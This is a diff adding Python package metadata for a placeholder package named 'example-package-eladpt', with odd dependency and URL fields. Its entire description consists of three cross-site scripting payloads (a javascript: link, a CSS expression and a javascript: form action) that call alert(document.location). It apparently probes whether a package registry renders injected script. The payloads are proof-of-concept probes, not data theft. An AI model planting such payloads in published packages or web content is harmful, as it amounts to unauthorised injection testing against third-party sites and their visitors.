@@ -1,0 +1,19 @@
+Metadata-Version: 2.1
+Name: example-package-eladpt
+Version: 0.0.24
+Summary: A small example package
+Author-email: Example Author <author@example.com>
+Project-URL: Homepage, http://another.com
+Project-URL: Bug Tracker, http://sec.com
+Classifier: Programming Language :: Python :: 3
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.8
+Description-Content-Type: text/markdown
+Requires-Dist: 123456
+
+# Testing
+
+
+<a href="javascript:alert(document.location);">XSS</a> // or
+<b style="width: expression(alert(document.location));">XSS</b> // or
+<form action="javascript:alert(document.location);"><input type="submit" /></form>
